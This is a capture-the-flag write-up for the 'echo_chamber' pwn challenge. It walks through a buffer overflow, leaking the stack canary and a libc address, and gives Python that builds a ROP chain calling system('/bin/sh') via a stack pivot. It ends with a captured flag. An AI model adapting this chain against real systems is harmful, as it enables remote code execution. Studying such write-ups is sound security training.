# echo_chamber

**Category:** Pwn

## Solution

1. I found that `read(0, buf, 0x70)` wrote into an `0x50`-byte buffer. The later `printf("echo: %s\n", buf)` could also read beyond the buffer because `read` did not add a NUL terminator. The format string itself was fixed.
2. I used a `0x28`-byte filler to leak a libc code pointer, then subtracted `0x816a5`. I classified that pointer against the shipped libc during local analysis, rather than treating every stack pointer as a libc address.
3. I sent `b'Q' * 0x50 + b'B' * 8 + b'C'` to overwrite the canary's leading NUL. The echo revealed its remaining seven bytes and the saved frame pointer. I restored the leading NUL and calculated `buf = main_rbp - 0x70`. A zero inside the leaked data could require a fresh connection.
4. The overflow ended at the saved return address, so I placed the ROP chain inside the input buffer. With `libc_base`, `buf`, and the eight-byte `canary` recovered above, the payload construction was:

   ```python
   p64 = lambda v: int(v).to_bytes(8, 'little')
   rop = (p64(0x4141414141414141)
          + p64(libc_base + 0x2A3E5)   # pop rdi; ret
          + p64(libc_base + 0x1D8678)  # "/bin/sh"
          + p64(libc_base + 0x29CD6)   # ret: stack alignment
          + p64(libc_base + 0x50D70)) # system

   payload = (rop.ljust(0x50, b'P') + b'Q' * 8 + canary
              + p64(buf) + p64(libc_base + 0x5629C))  # leave; ret
   assert len(payload) == 0x70
   ```

5. I sent the payload, then `bye\n` to leave the loop. The restored canary passed the stack check, and `leave; ret` pivoted into the buffer. These offsets depend on the supplied libc.
6. The saved remote-shell transcript shows `SHELL_OK`, followed by the flag when I read `flag*`. I kept that original value below.

## Flag

```text
CSCTF{i7B9xaHOuurq6wmYew31Pb6W}
```

> **Note:** The binary, matching libc/loader, and live service are absent. The shell result is from my saved transcript; I did not rerun the exploit during this review.
